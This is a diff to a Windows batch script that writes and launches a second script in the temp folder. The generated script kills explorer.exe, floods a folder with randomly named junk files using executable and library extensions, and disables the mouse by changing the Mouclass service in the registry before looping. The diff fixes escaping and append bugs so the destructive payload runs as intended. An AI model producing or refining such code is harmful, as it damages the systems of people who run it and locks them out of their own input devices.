@@ -60,20 +60,20 @@ echo taskkill /f /im explorer.exe >nul
 echo start /min notepad.exe >nul
 echo cd %FileLocation%
 echo md %random%%random%%random%%random%%random%%random%%random% >nul
-echo echo %random%%random%%random%%random%%random%%random%%random% >%random%%random%txt
-echo echo %random%%random%%random%%random%%random%%random%%random% >%random%%random%bat
-echo echo %random%%random%%random%%random%%random%%random%%random% >%random%%random%exe
-echo echo %random%%random%%random%%random%%random%%random%%random% >%random%%random%dII
-echo echo %random%%random%%random%%random%%random%%random%%random% >%random%%random%.exe
-echo echo %random%%random%%random%%random%%random%%random%%random% >%random%%random%.txt
-echo echo %random%%random%%random%%random%%random%%random%%random% >%random%%random%.bat
-echo echo %random%%random%%random%%random%%random%%random%%random% >%random%%random%.dII
+echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%txt
+echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%bat
+echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%exe
+echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%dII
+echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%.exe
+echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%.txt
+echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%.bat
+echo echo %random%%random%%random%%random%%random%%random%%random% >>%random%%random%.dII
 echo start /min %temp%\OMFGA.bat
 echo rem ---------------------
 echo rem Disable Mouse
 echo set key="HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesMouclass"
-echo reg delete %key%
-echo reg add %key% /v Start /t REG_DWORD /d 4
+echo reg delete %%key%%
+echo reg add %%key%% /v Start /t REG_DWORD /d 4
 echo rem --------------------- 
 echo goto Loophole
 ) >%temp%\OMFGA.bat
